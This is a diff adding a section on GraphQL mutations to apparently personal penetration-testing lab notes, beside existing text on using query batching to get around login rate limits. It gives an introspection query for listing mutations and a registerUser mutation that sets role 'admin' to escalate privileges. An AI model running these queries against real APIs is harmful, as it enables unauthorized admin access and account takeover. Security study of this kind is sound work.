@@ -583,3 +583,140 @@ Batching is not a security vulnerability but an intended feature that can be ena
 
 For instance, assume a web app uses GraphQL queries for user login. The GraphQL endpoint is protected by a rate limit, allowing only five requests per second. An attacker can brute-force user accounts at a rate of only five passwords per second. However, using GraphQL batching, an attacker can put multiple login queries into a single HTTP request. Assuming the attacker constructs an HTTP request containing 1000 different GraphQL login queries, the attacker can now brute-force user accounts with up to 5000 passwords per second, rendering the rate limit ineffective. Thus, GraphQL batching can enable powerful brute-force attacks.
 
+### Mutations
+
+#### What are Mutations?
+
+Mutations are GraphQL queries that modify server data. They can be used to create new objects, update existing objects, or delete existing objects.
+
+Start by identifying all mutations supported by the backend and their arguments. Use the following introspection query:
+
+```graphql
+query {
+  __schema {
+    mutationType {
+      name
+      fields {
+        name
+        args {
+          name
+          defaultValue
+          type {
+            ...TypeRef
+          }
+        }
+      }
+    }
+  }
+}
+
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+From the result, you can identify a mutation `registerUser`, presumably allowing you to create new users. The mutation requires a `RegisterUserInput` object as an input.
+
+![graphql 21](../../../../images/graphql21.png)
+
+You can now query all fields of the `RegisterUserInput` object with the following introspection query to obtain all fields that you can use in the mutation:
+
+```graphql
+{   
+  __type(name: "RegisterUserInput") {
+    name
+    inputFields {
+      name
+      description
+      defaultValue
+    }
+  }
+}
+```
+
+From the result, you can identify that you can provide the new user's `username`, `password`, `role`, and `msg`:
+
+![graphql 22](../../../../images/graphql22.png)
+
+As you identified earlier, you need to provide the password as an MD5 hash. To hash your password, you can use the following command:
+
+```bash
+d41y@htb[/htb]$ echo -n 'password' | md5sum
+
+5f4dcc3b5aa765d61d8327deb882cf99  -
+```
+
+With the hashed password, you can now finally register a new user by running the mutation:
+
+```graphql
+mutation {
+  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
+    user {
+      username
+      password
+      msg
+      role
+    }
+  }
+}
+```
+
+The result contains the fields you queried in the mutation's body so that you can check for errors:
+
+![graphql 23](../../../../images/graphql23.png)
+
+You can now successfully log in to the application with your newly registered user.
+
+#### Exploitation
+
+To identify potential attack vectors through mutations, you must thoroughly examine all supported mutations and their corresponding inputs. In this case, you can provide the `role` argument for newly registered users, which might enable you to create users with a different role than the default one, potentially allowing you to escalate privileges.
+
+You have identified the roles `user` and `admin` by querying all existing users. Create a new user with the role `admin` and check if this enables you to access the internal admin endpoint at `/admin`. You can use the following GraphQL mutation:
+
+```graphql
+mutation {
+  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
+    user {
+      username
+      password
+      msg
+      role
+    }
+  }
+}
+```
+
+In the result, you can see that the role `admin` is reflected, which indicates that the attack was successful.
+
+![graphql 24](../../../../images/graphql24.png)
+
+After logging in, you can now access the admin endpoint, meaning you have successfully escalated your privileges.
